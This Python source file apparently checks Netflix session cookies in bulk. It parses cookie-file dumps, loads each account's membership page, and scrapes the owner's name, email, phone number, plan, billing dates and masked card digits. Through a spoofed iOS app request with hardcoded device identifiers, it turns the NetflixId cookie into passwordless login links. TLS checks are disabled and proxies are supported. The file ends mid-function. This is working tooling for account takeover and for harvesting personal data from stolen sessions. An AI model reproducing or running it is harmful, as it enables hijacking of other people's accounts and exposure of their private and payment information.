import html
import re
import requests
import json
import unicodedata
import threading
from collections import OrderedDict
from datetime import datetime
from typing import Optional, Dict, Any, Tuple
from urllib3.exceptions import InsecureRequestWarning
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

_thread_local = threading.local()

def _get_session() -> requests.Session:
    if not hasattr(_thread_local, 'session'):
        session = requests.Session()
        adapter = HTTPAdapter(
            pool_connections=20,
            pool_maxsize=20,
            max_retries=Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        )
        session.mount('https://', adapter)
        session.mount('http://', adapter)
        session.verify = False
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'keep-alive',
        })
        _thread_local.session = session
    return _thread_local.session

RE_PATTERNS = {
    'userInfo_name': re.compile(r'userInfo"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"'),
    'accountOwnerName': re.compile(r'"accountOwnerName"\s*:\s*"([^"]+)"'),
    'emailAddress': re.compile(r'"emailAddress"\s*:\s*"([^"]+)"'),
    'email': re.compile(r'"email"\s*:\s*"([^"]+)"'),
    'currentCountry': re.compile(r'"currentCountry"\s*:\s*"([^"]+)"'),
    'countryOfSignup': re.compile(r'"countryOfSignup":\s*"([^"]+)"'),
    'memberSince': re.compile(r'"memberSince":\s*"([^"]+)"'),
    'nextBillingDate_alt': re.compile(r'"GrowthNextBillingDate"\s*,\s*"date"\s*:\s*"([^"T]+)T'),
    'nextBillingDate': re.compile(r'"nextBillingDate"\s*:\s*"([^"]+)"'),
    'userGuid': re.compile(r'"userGuid":\s*"([^"]+)"'),
    'membershipStatus': re.compile(r'"membershipStatus":\s*"([^"]+)"'),
    'localizedPlanName': re.compile(r'localizedPlanName\":\{\"fieldType\":\"String\",\"value\":\"([^"]+)"'),
    'currentPlan_name': re.compile(r'"currentPlan"\s*:\s*\{[\s\S]*?"plan"\s*:\s*\{[\s\S]*?"name"\s*:\s*"([^"]+)"'),
    'formattedPlanPrice': re.compile(r'"formattedPlanPrice"\s*:\s*"([^"]+)"'),
    'formattedPrice': re.compile(r'"formattedPrice"\s*:\s*"([^"]+)"'),
    'paymentMethod': re.compile(r'"paymentMethod"\s*:\s*"([^"]+)"'),
    'paymentCardDisplayString': re.compile(r'"paymentCardDisplayString"\s*:\s*"([^"]+)"'),
    'maskedCard': re.compile(r'"maskedCard"\s*:\s*"([^"]+)"'),
    'phoneNumberDigits': re.compile(r'"phoneNumberDigits"\s*:\s*\{[\s\S]*?"value"\s*:\s*"([^"]+)"'),
    'phoneNumber': re.compile(r'"phoneNumber"\s*:\s*"([^"]+)"'),
    'phoneVerified': re.compile(r'"phoneVerified"\s*:\s*(true|false)'),
    'videoQuality_field': re.compile(r'videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"'),
    'videoQuality': re.compile(r'"videoQuality"\s*:\s*"([^"]+)"'),
    'holdStatus': re.compile(r'"holdStatus"\s*:\s*(true|false)'),
    'isUserOnHold': re.compile(r'"isUserOnHold"\s*:\s*(true|false)'),
    'emailVerified': re.compile(r'"emailVerified"\s*:\s*(true|false)'),
    'maxStreams_field': re.compile(r'maxStreams\":\{\"fieldType\":\"Numeric\",\"value\":([^,]+),'),
    'maxStreams': re.compile(r'"maxStreams"\s*:\s*"?([^",]+)"?'),
    'profileName': re.compile(r'"profileName"\s*:\s*"([^"]+)"'),
    'profileName_field': re.compile(r'"profileName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"'),
    'profile_typename': re.compile(r'"__typename"\s*:\s*"Profile"'),
    'profile_name': re.compile(r'"name"\s*:\s*"([^"]+)"'),
}

NETFLIX_COOKIE_NAMES = {
    'thx_guid', 'tmx_guid', 'nfvdid', 'NetflixId',
    'SecureNetflixId', 'OptanonConsent',
    'netflix-sans-bold-3-loaded', 'netflix-sans-normal-3-loaded'
}

LOGIN_DEVICES = ("pc", "phone", "tv")
LOGIN_LINK_TEMPLATES = {
    "pc": "https://netflix.com/?nftoken={token}",
    "phone": "https://netflix.com/unsupported?nftoken={token}",
    "tv": "https://netflix.com/tv2?nftoken={token}",
}

NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
NFTOKEN_QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}
NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

_COUNTRY_CODE_TO_NAME = {
    "AE": "United Arab Emirates",
    "BH": "Bahrain",
    "DZ": "Algeria",
    "EG": "Egypt",
    "IQ": "Iraq",
    "JO": "Jordan",
    "KW": "Kuwait",
    "LB": "Lebanon",
    "LY": "Libya",
    "MA": "Morocco",
    "OM": "Oman",
    "QA": "Qatar",
    "SA": "Saudi Arabia",
    "SD": "Sudan",
    "SY": "Syria",
    "TN": "Tunisia",
    "YE": "Yemen",
    "US": "United States",
    "GB": "United Kingdom",
    "AU": "Australia",
    "CA": "Canada",
    "IN": "India",
    "NZ": "New Zealand",
    "ZA": "South Africa",
    "FR": "France",
    "BE": "Belgium",
    "CH": "Switzerland",
    "DE": "Germany",
    "AT": "Austria",
    "ES": "Spain",
    "MX": "Mexico",
    "AR": "Argentina",
    "TR": "Turkey",
    "RU": "Russia",
    "CN": "China",
    "TW": "Taiwan",
    "JP": "Japan",
    "KR": "South Korea",
    "PT": "Portugal",
    "BR": "Brazil",
    "IT": "Italy",
    "NL": "Netherlands",
    "PL": "Poland",
    "SE": "Sweden",
    "NO": "Norway",
    "DK": "Denmark",
    "FI": "Finland",
    "CZ": "Czech Republic",
    "RO": "Romania",
    "HU": "Hungary",
    "GR": "Greece",
    "IL": "Israel",
    "IR": "Iran",
    "ID": "Indonesia",
    "MY": "Malaysia",
    "TH": "Thailand",
    "VN": "Vietnam",
    "UA": "Ukraine",
}


def decode_netflix_value(value):
    if value is None:
        return None
    cleaned = html.unescape(str(value))
    replacements = {
        "\\x20": " ",
        "\\u00A0": " ",
        "\\u00a0": " ",
        "&nbsp;": " ",
        "u00A0": " ",
    }
    for src, dst in replacements.items():
        cleaned = cleaned.replace(src, dst)
    cleaned = cleaned.replace("\\/", "/").replace('\\"', '"').replace("\\n", " ").replace("\\t", " ")
    for _ in range(3):
        prev = cleaned
        cleaned = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), cleaned)
        cleaned = re.sub(r"\\x([0-9a-fA-F]{2})", lambda m: chr(int(m.group(1), 16)), cleaned)
        cleaned = cleaned.replace("\\\\", "\\")
        if cleaned == prev:
            break
    cleaned = re.sub(r"(?<=[A-Za-z])\s+(?=[^\x00-\x7F])", "", cleaned)
    cleaned = re.sub(r"\s+", " ", cleaned).strip()
    return cleaned or None

def extract_first_match(response_text, pattern):
    match = pattern.search(response_text)
    if match:
        return decode_netflix_value(match.group(1))
    return None

def parse_boolean_value(value):
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)) and not isinstance(value, bool):
        if value == 1:
            return True
        if value == 0:
            return False
        return None
    if isinstance(value, dict):
        for key in ("value", "isUserOnHold", "holdStatus", "isOnHold", "pastDue", "isPastDue", "isVerified", "verified"):
            if key in value:
                parsed = parse_boolean_value(value.get(key))
                if parsed is not None:
                    return parsed
        return None
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    lowered = str(cleaned).strip().lower()
    truthy = {"true", "yes", "1", "on"}
    falsy = {"false", "no", "0", "off"}
    if lowered in truthy:
        return True
    if lowered in falsy:
        return False
    return None

def format_boolean_label(value):
    parsed = parse_boolean_value(value)
    if parsed is True:
        return "Yes"
    if parsed is False:
        return "No"
    return None

def country_code_to_name(code: str) -> str:
    if not code:
        return "Unknown"
    return _COUNTRY_CODE_TO_NAME.get(code.upper(), code)

def format_display_date(value):
    if not value:
        return ""
    try:
        dt = datetime.strptime(value.split("T")[0], "%Y-%m-%d")
        return dt.strftime("%B %d, %Y")
    except:
        return value

def format_member_since(value):
    if not value:
        return ""
    try:
        dt = datetime.strptime(value, "%Y-%m") if len(value) == 7 else datetime.strptime(value, "%Y-%m-%d")
        return dt.strftime("%B %Y")
    except:
        return value

def normalize_phone_number(value, country_code=None):
    if not value:
        return None
    digits = re.sub(r"\D+", "", str(value))
    if digits.startswith("0") and len(digits) >= 10:
        return f"+91{digits.lstrip('0')}"
    return value

def normalize_plan_key(plan_name):
    if not plan_name:
        return "unknown"
    simplified = unicodedata.normalize("NFKD", plan_name)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    normalized = re.sub(r"[^\w]+", "_", simplified.lower(), flags=re.UNICODE).strip("_")
    return normalized or "unknown"

def get_canonical_output_label(plan_key):
    canonical_labels = {
        "premium": "Premium",
        "standard_with_ads": "Standard With Ads",
        "standard": "Standard",
        "basic": "Basic",
        "mobile": "Mobile",
        "extra_member_premium": "Premium (Extra Member)",
        "free": "Free",
        "duplicate": "Duplicate",
        "unknown": "Unknown",
    }
    return canonical_labels.get(plan_key, "Unknown")

def _int_or_none(value):
    cleaned = decode_netflix_value(value)
    if cleaned is None:
        return None
    try:
        return int(str(cleaned).strip())
    except Exception:
        match = re.search(r"\d+", str(cleaned))
        if match:
            try:
                return int(match.group(0))
            except Exception:
                return None
        return None

def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    raw_quality = decode_netflix_value(info.get("videoQuality"))
    streams = _int_or_none(info.get("maxStreams"))

    if not is_subscribed and not raw_plan:
        return "free", "Free"

    normalized = normalize_plan_key(raw_plan) if raw_plan else ""

    plan_aliases = {
        "premium": {"premium", "premium_extra_member", "extra_member_premium", "cao_cap", "cao_c_ap", "caocap", "高級", "高級方案", "高级", "ozel", "المميزة", "พรีเมียม", "프리미엄", "プレミアム", "פרימיום", "πριμιουμ"},
        "standard_with_ads": {"standard_with_ads", "estandar_con_anuncios", "padrao_com_anuncios", "광고형_스탠다드", "standard_avec_pub", "standard_con_pubblicita", "standard_abo_mit_werbung", "الخطة_القياسية_مع_اعلانات", "standardowy_z_reklamami", "τυπικο_με_διαφημισεις", "広告付きスタンダード", "附广告标准"},
        "standard": {"standard", "estandar", "標準方案", "标准", "standardowy", "padrao", "standart", "tieuchuan", "標準", "มาตรฐาน", "스탠다드", "スタンダード", "τυπικο", "standardni", "standaard", "القياسية", "סטנדרטית"},
        "basic": {"basic", "basic_with_ads", "basico", "dasar", "basique", "basis", "βασικο", "基本", "베이직", "ベーシック", "temel", "พื้นฐาน", "podstawowy", "الاساسية", "בסיסית", "osnovni", "alap", "base", "essentiel"},
        "mobile": {"ponsel", "mobile", "seluler", "movil", "มือถือ", "모바일", "モバイル"},
    }
    for canonical, aliases in plan_aliases.items():
        if normalized in aliases:
            return canonical, get_canonical_output_label(canonical)

    if streams is not None:
        quality_norm = normalize_plan_key(raw_quality) if raw_quality else ""
        if streams >= 4 or quality_norm in {"uhd", "ultra_hd", "4k"}:
            return "premium", "Premium"
        if streams >= 2 or quality_norm in {"hd", "full_hd"}:
            return "standard", "Standard"
        if streams == 1:
            if normalized in {"ponsel", "mobile"}:
                return "mobile", "Mobile"
            return "basic", "Basic"

    if raw_plan:
        return normalize_plan_key(raw_plan), raw_plan
    if not is_subscribed:
        return "free", "Free"
    return "unknown", "Unknown"

def is_extra_member_account(info):
    if not isinstance(info, dict):
        return False
    explicit_flag = decode_netflix_value(info.get("isExtraMemberAccount"))
    if explicit_flag:
        lowered_flag = explicit_flag.strip().lower()
        if lowered_flag in {"yes", "true", "1"}:
            return True
        if lowered_flag in {"no", "false", "0"}:
            return False
    localized_plan = decode_netflix_value(info.get("localizedPlanName")) or ""
    membership_status = decode_netflix_value(info.get("membershipStatus")) or ""
    candidates = [localized_plan, membership_status]
    markers = ("extra member", "miembro extra", "suscriptor extra", "membro extra", "assinante extra",
               "abbonato extra", "abonne supplementaire", "abonent extra", "ekstra uye", "额外成员", "額外成員", "추가 회원")
    for value in candidates:
        if not value:
            continue
        lowered = value.lower()
        if any(marker in lowered for marker in markers):
            return True
    return False

def is_subscribed_account(info):
    status = normalize_plan_key((info or {}).get("membershipStatus"))
    if status == "current_member":
        return True
    return is_extra_member_account(info)

def is_on_hold_account(info):
    hold_value = format_boolean_label((info or {}).get("holdStatus"))
    if hold_value is not None:
        return hold_value == "Yes"
    membership_status = normalize_plan_key((info or {}).get("membershipStatus"))
    return any(token in membership_status for token in ("hold", "past_due", "payment_retry", "paused", "suspend"))

def extract_profile_names(response_text):
    names = []
    for pattern in (RE_PATTERNS['profileName'], RE_PATTERNS['profileName_field']):
        for found in pattern.findall(response_text):
            decoded = decode_netflix_value(found)
            if decoded and decoded not in names:
                names.append(decoded)
    for match in RE_PATTERNS['profile_typename'].finditer(response_text):
        snippet = response_text[match.start():match.start() + 1200]
        name_match = RE_PATTERNS['profile_name'].search(snippet)
        if name_match:
            decoded = decode_netflix_value(name_match.group(1))
            if decoded and decoded not in names:
                names.append(decoded)
    return ", ".join(names) if names else None

def extract_info_from_graphql_payload(response_text):
    try:
        payload = json.loads(response_text)
    except Exception:
        return {}
    if not isinstance(payload, dict):
        return {}
    data = payload.get("data") or {}
    growth_account = data.get("growthAccount") or {}
    current_profile = data.get("currentProfile") or {}
    current_plan = ((growth_account.get("currentPlan") or {}).get("plan") or {})
    next_plan = ((growth_account.get("nextPlan") or {}).get("plan") or {})
    next_billing = growth_account.get("nextBillingDate") or {}
    hold_meta = growth_account.get("growthHoldMetadata") or {}
    local_phone = growth_account.get("growthLocalizablePhoneNumber") or {}
    raw_phone = local_phone.get("rawPhoneNumber") or {}
    payment_methods = growth_account.get("growthPaymentMethods") or []
    payment_method = payment_methods[0] if payment_methods and isinstance(payment_methods[0], dict) else {}
    payment_logo = (payment_method.get("paymentOptionLogo") or {}).get("paymentOptionLogo")
    payment_typename = str(payment_method.get("__typename") or "")
    payment_display_text = decode_netflix_value(payment_method.get("displayText"))
    profiles = growth_account.get("profiles") or []

    phone_digits = None
    phone_verified_graphql = None
    phone_country_code = None
    if isinstance(raw_phone, dict):
        phone_digits_obj = raw_phone.get("phoneNumberDigits") or {}
        phone_digits = phone_digits_obj.get("value") if isinstance(phone_digits_obj, dict) else raw_phone.get("phoneNumberDigits")
        phone_verified_graphql = raw_phone.get("isVerified")
        phone_country_code = raw_phone.get("countryCode")
    else:
        phone_digits = raw_phone

    def _growth_email(profile_obj):
        if not isinstance(profile_obj, dict):
            return None, None
        growth_email = profile_obj.get("growthEmail") or {}
        email_obj = growth_email.get("email") or {}
        email_value = email_obj.get("value") if isinstance(email_obj, dict) else None
        return email_value, growth_email.get("isVerified")

    email_value, email_verified = _growth_email(current_profile)
    if not email_value:
        for profile in profiles:
            email_value, email_verified = _growth_email(profile)
            if email_value:
                break

    profile_names = []
    for profile in profiles:
        if isinstance(profile, dict):
            name = decode_netflix_value(profile.get("name"))
            if name and name not in profile_names:
                profile_names.append(name)

    feature_types = []
    for plan_obj in (current_plan, next_plan):
        for feature in (plan_obj.get("availableFeatures") or []):
            if isinstance(feature, dict) and feature.get("type"):
                feature_types.append(str(feature["type"]).upper())

    def _extract_price_value(plan_obj):
        if not isinstance(plan_obj, dict):
            return None
        direct_candidates = [
            plan_obj.get("priceDisplay"),
            plan_obj.get("displayPrice"),
            plan_obj.get("formattedPrice"),
            plan_obj.get("formattedPlanPrice"),
            plan_obj.get("planPriceDisplay"),
        ]
        for candidate in direct_candidates:
            decoded = decode_netflix_value(candidate)
            if decoded:
                return decoded
        price_obj = plan_obj.get("price")
        if isinstance(price_obj, dict):
            for key in ("displayValue", "formatted", "formattedPrice", "displayPrice", "value", "amountDisplay"):
                decoded = decode_netflix_value(price_obj.get(key))
                if decoded:
                    return decoded
        return None

    hold_status = None
    if isinstance(hold_meta, dict):
        hold_status = format_boolean_label(hold_meta.get("isUserOnHold"))
    if hold_status is None:
        hold_status = format_boolean_label(growth_account.get("isUserOnHold"))

    info = {
        "accountOwnerName": decode_netflix_value(current_profile.get("name")),
        "email": decode_netflix_value(email_value),
        "countryOfSignup": decode_netflix_value(((growth_account.get("countryOfSignUp") or {}).get("code"))),
        "memberSince": decode_netflix_value(growth_account.get("memberSince")),
        "nextBillingDate": decode_netflix_value(next_billing.get("localDate") or next_billing.get("date")),
        "userGuid": decode_netflix_value(growth_account.get("ownerGuid") or current_profile.get("guid")),
        "showExtraMemberSection": "Yes" if "EXTRA_MEMBER" in feature_types else "No" if feature_types else None,
        "membershipStatus": decode_netflix_value(growth_account.get("membershipStatus")),
        "localizedPlanName": decode_netflix_value(current_plan.get("name") or next_plan.get("name")),
        "planPrice": _extract_price_value(current_plan) or _extract_price_value(next_plan),
        "paymentMethodType": decode_netflix_value(payment_logo or growth_account.get("payer")),
        "maskedCard": None,
        "phoneNumber": phone_digits,
        "videoQuality": decode_netflix_value(current_plan.get("videoQuality")),
        "holdStatus": hold_status,
        "emailVerified": format_boolean_label(email_verified),
        "phoneVerified": format_boolean_label(phone_verified_graphql),
        "profiles": ", ".join(profile_names) if profile_names else None,
        "maxStreams": decode_netflix_value(current_plan.get("maxStreams")),
    }
    if "Card" in payment_typename:
        info["paymentMethodType"] = "CC"
        if payment_display_text:
            if re.fullmatch(r"\d{4}", payment_display_text):
                info["maskedCard"] = payment_display_text
            else:
                info["maskedCard"] = payment_display_text
    elif payment_display_text and payment_logo is None and not re.fullmatch(r"\d{4}", payment_display_text):
        info["paymentMethodType"] = info["paymentMethodType"] or payment_display_text
    if not info["paymentMethodType"] and payment_methods and "Card" in payment_typename:
        info["paymentMethodType"] = "CC"
    return {key: value for key, value in info.items() if value not in (None, "", [], {})}

def extract_info(response_text):
    graphql_info = extract_info_from_graphql_payload(response_text)
    fallback = {
        "accountOwnerName": extract_first_match(response_text, RE_PATTERNS['userInfo_name']) or extract_first_match(response_text, RE_PATTERNS['accountOwnerName']),
        "email": extract_first_match(response_text, RE_PATTERNS['emailAddress']) or extract_first_match(response_text, RE_PATTERNS['email']),
        "countryOfSignup": extract_first_match(response_text, RE_PATTERNS['currentCountry']) or extract_first_match(response_text, RE_PATTERNS['countryOfSignup']),
        "memberSince": extract_first_match(response_text, RE_PATTERNS['memberSince']),
        "nextBillingDate": extract_first_match(response_text, RE_PATTERNS['nextBillingDate_alt']) or extract_first_match(response_text, RE_PATTERNS['nextBillingDate']),
        "userGuid": extract_first_match(response_text, RE_PATTERNS['userGuid']),
        "membershipStatus": extract_first_match(response_text, RE_PATTERNS['membershipStatus']),
        "localizedPlanName": extract_first_match(response_text, RE_PATTERNS['localizedPlanName']) or extract_first_match(response_text, RE_PATTERNS['currentPlan_name']),
        "planPrice": extract_first_match(response_text, RE_PATTERNS['formattedPlanPrice']) or extract_first_match(response_text, RE_PATTERNS['formattedPrice']),
        "paymentMethodType": extract_first_match(response_text, RE_PATTERNS['paymentMethod']),
        "maskedCard": extract_first_match(response_text, RE_PATTERNS['paymentCardDisplayString']) or extract_first_match(response_text, RE_PATTERNS['maskedCard']),
        "phoneNumber": extract_first_match(response_text, RE_PATTERNS['phoneNumberDigits']) or extract_first_match(response_text, RE_PATTERNS['phoneNumber']),
        "phoneVerified": extract_first_match(response_text, RE_PATTERNS['phoneVerified']),
        "videoQuality": extract_first_match(response_text, RE_PATTERNS['videoQuality_field']) or extract_first_match(response_text, RE_PATTERNS['videoQuality']),
        "holdStatus": extract_first_match(response_text, RE_PATTERNS['holdStatus']) or extract_first_match(response_text, RE_PATTERNS['isUserOnHold']),
        "emailVerified": extract_first_match(response_text, RE_PATTERNS['emailVerified']),
        "maxStreams": extract_first_match(response_text, RE_PATTERNS['maxStreams_field']) or extract_first_match(response_text, RE_PATTERNS['maxStreams']),
        "profiles": extract_profile_names(response_text),
    }
    merged = dict(fallback)
    merged.update(graphql_info)
    for bool_field in ["holdStatus", "emailVerified", "showExtraMemberSection", "phoneVerified"]:
        if merged.get(bool_field) is not None and merged[bool_field] not in ("Yes", "No"):
            merged[bool_field] = format_boolean_label(merged[bool_field])
    return merged

def get_account_page(session, proxy=None, timeout=30):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept-Encoding": "identity",
    }
    try:
        response = session.get(
            "https://www.netflix.com/account/membership",
            headers=headers,
            proxies=proxy,
            timeout=timeout,
            allow_redirects=True,
            verify=False,
        )
        if response.status_code != 200:
            return None, response.status_code, None
        info = extract_info(response.text)
        if not info.get("countryOfSignup"):
            fallback_resp = session.get(
                "https://www.netflix.com/YourAccount",
                headers=headers,
                proxies=proxy,
                timeout=timeout,
                allow_redirects=True,
                verify=False,
            )
            if fallback_resp.status_code == 200:
                fallback_info = extract_info(fallback_resp.text)
                info.update(fallback_info)
        return response.text, response.status_code, info
    except Exception:
        return None, None, None

def parse_cookie_string(cookie_str: str) -> OrderedDict:
    cookies = OrderedDict()
    for part in cookie_str.split(';'):
        part = part.strip()
        if not part or '=' not in part:
            continue
        key, val = part.split('=', 1)
        cookies[key.strip()] = val.strip()
    return cookies

def extract_cookies_dict(file_content: str) -> OrderedDict:
    cookies = OrderedDict()
    for line in file_content.splitlines():
        line = line.strip()
        if line.startswith('.netflix.com'):
            parts = line.split()
            if len(parts) >= 7:
                name, value = parts[5], parts[6]
                if name in NETFLIX_COOKIE_NAMES or name.startswith('netflix-sans'):
                    cookies[name] = value
    for cookie_name in NETFLIX_COOKIE_NAMES:
        pattern = rf'\b{re.escape(cookie_name)}\s*=\s*([^;\n]+)'
        matches = re.findall(pattern, file_content, re.IGNORECASE)
        if matches:
            cookies[cookie_name] = matches[-1].strip()
    generic_pattern = r'\b([a-zA-Z0-9_-]+)=([^;\n]+)'
    for match in re.finditer(generic_pattern, file_content):
        name, value = match.group(1), match.group(2).strip()
        if (name in NETFLIX_COOKIE_NAMES or
            name.startswith('netflix') or
            name.endswith('Guid') or
            name in ('OptanonConsent', 'nfvdid')):
            cookies[name] = value
    clean = OrderedDict()
    for k, v in cookies.items():
        if v and len(v) < 5000:
            clean[k] = v
    return clean

def create_nftoken(cookie_dict, attempts=3, proxy=None):
    netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
    if not netflix_id:
        return None, None

    headers = NFTOKEN_HEADERS.copy()
    headers["Cookie"] = f"NetflixId={netflix_id}"
    session = _get_session()

    for _ in range(attempts):
        try:
            response = session.get(
                NFTOKEN_API_URL,
                params=NFTOKEN_QUERY_PARAMS,
                headers=headers,
                timeout=30,
                proxies=proxy,
                verify=False,
            )
            if response.status_code != 200:
                continue
            data = response.json()
            token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
            token = decode_netflix_value(token_data.get("token"))
            expires = token_data.get("expires")
            if token:
                if isinstance(expires, int) and len(str(expires)) == 13:
                    expires //= 1000
                return token, expires
        except Exception:
            continue
    return None, None

def build_login_link(token: str, device: str = "pc") -> str:
    template = LOGIN_LINK_TEMPLATES.get(device, LOGIN_LINK_TEMPLATES["pc"])
    return template.format(token=token)

def compute_days_left(next_billing_str: Optional[str]) -> Optional[int]:
    if not next_billing_str:
        return None
    try:
        dt = datetime.strptime(next_billing_str.split("T")[0], "%Y-%m-%d")
        delta = dt - datetime.now()
        return max(0, delta.days)
    except Exception:
        return None

def _build_info_dict(info: Dict[str, Any], is_subscribed: bool) -> Dict[str, Any]:
    plan_key, plan_name = derive_plan_info(info, is_subscribed)
    member_since = format_member_since(info.get("memberSince"))
    next_billing = format_display_date(info.get("nextBillingDate"))
    days_left = compute_days_left(info.get("nextBillingDate"))

    country_code = info.get("countryOfSignup") or ""
    country_name = country_code_to_name(country_code) if country_code else "Unknown"

    profiles_raw = info.get("profiles")
    if profiles_raw:
        profile_list = [p.strip() for p in profiles_raw.split(",") if p.strip()]
        profiles_str = f"{len(profile_list)}: {', '.join(profile_list)}" if profile_list else "None"
    else:
        profiles_str = "None"

    max_streams_val = _int_or_none(info.get("maxStreams"))
    max_streams_str = str(max_streams_val) if max_streams_val is not None else "N/A"

    return {
        "name": decode_netflix_value(info.get("accountOwnerName")) or "N/A",
        "email": decode_netflix_value(info.get("email")) or "N/A",
        "country": country_name,
        "plan": plan_name or "N/A",
        "plan_price": decode_netflix_value(info.get("planPrice")) or "N/A",
        "max_streams": max_streams_str,
        "member_since": member_since or "N/A",
        "next_billing": next_billing or "N/A",
        "quality": decode_netflix_value(info.get("videoQuality")) or "N/A",
        "payment": decode_netflix_value(info.get("paymentMethodType")) or "N/A",
        "card": decode_netflix_value(info.get("maskedCard")) or "N/A",
        "phone": normalize_phone_number(info.get("phoneNumber")) or "N/A",
        "days_left": str(days_left) if days_left is not None else "N/A",
        "membership_status": decode_netflix_value(info.get("membershipStatus")) or "N/A",
        "profiles": profiles_str,
        "expires_at": "N/A",
    }

def quick_check_cookie_content(content: str) -> Tuple[bool, Optional[Dict[str, Any]]]:
    """Validate cookie membership without creating a login token (no notifications)."""
    if not content:
        return False, None

    cookies_dict = extract_cookies_dict(content)
    if not cookies_dict or "NetflixId" not in cookies_dict:
        return False, None

    session = _get_session()
    session.cookies.clear()
    for name, value in cookies_dict.items():
        session.cookies.set(name, value, domain=".netflix.com", path="/")

    _, status_code, info = get_account_page(session)
    if status_code != 200 or not info:
        return False, None

    is_subscribed = is_subscribed_account(info)
    info_dict = _build_info_dict(info, is_subscribed)
    if not is_subscribed:
        return False, info_dict
    return True, info_dict


def quick_check_cookie_file(file_path: str) -> Tuple[bool, Optional[Dict[str, Any]]]:
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
    except Exception:
        return False, None
    return quick_check_cookie_content(content)


def check_cookie_file(file_path: str, device: str = "pc") -> Tuple[Optional[str], Optional[Dict[str, Any]]]:
    if device not in LOGIN_DEVICES:
        device = "pc"

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
    except Exception:
        return None, None

    if not content:
        return None, None

    cookies_dict = extract_cookies_dict(content)
    if not cookies_dict or 'NetflixId' not in cookies_dict:
        return None, None

    session = _get_session()
    for name, value in cookies_dict.items():
        session.cookies.set(name, value, domain='.netflix.com', path='/')

    _, status_code, info = get_account_page(session)
    if status_code != 200 or not info:
        return None, None

    is_subscribed = is_subscribed_account(info)

    info_dict = _build_info_dict(info, is_subscribed)

    if not is_subscribed:
        return None, info_dict

